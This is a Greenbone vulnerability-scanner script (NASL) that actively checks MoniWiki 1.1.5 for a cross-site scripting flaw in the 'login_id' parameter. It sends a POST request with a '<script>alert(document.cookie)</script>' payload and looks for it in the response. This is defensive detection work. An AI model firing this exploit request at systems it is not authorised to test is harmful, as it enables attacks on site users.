# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902794");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-02-21 17:36:32 +0530 (Tue, 21 Feb 2012)");
  script_name("MoniWiki <= 1.1.5 'login_id' XSS Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/109902/moniwiki-xss.txt");
  script_xref(name:"URL", value:"https://web.archive.org/web/20121128212512/http://www.securelist.com/en/advisories/48109");
  script_xref(name:"URL", value:"http://secunia.com/advisories/48109");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/17835");

  script_tag(name:"summary", value:"MoniWiki is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an input passed to the 'login_id' POST
  parameter in 'wiki.php' (when 'action' is set to 'userform') is not properly
  sanitised before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in context of an affected site.");

  script_tag(name:"affected", value:"MoniWiki version 1.1.5 is known to be affected. Other versions
  might be affected as well.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach dir(make_list_unique("/moniwiki", "/MoniWiki", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  res = http_get_cache(item:dir + "/wiki.php", port:port);
  if(!res || res !~ "^HTTP/1\.[01] 200" || res !~ "(powered by MoniWiki|<wikiHeader>)")
    continue;

  data = "action=userform&login_id=<script>alert(document.cookie)</script>&password=<script>alert(document.cookie)</script>";

  url = dir + "/wiki.php/FrontPage";

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(data), "\r\n",
               "\r\n", data);
  res = http_keepalive_send_recv(port:port, data:req);

  if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
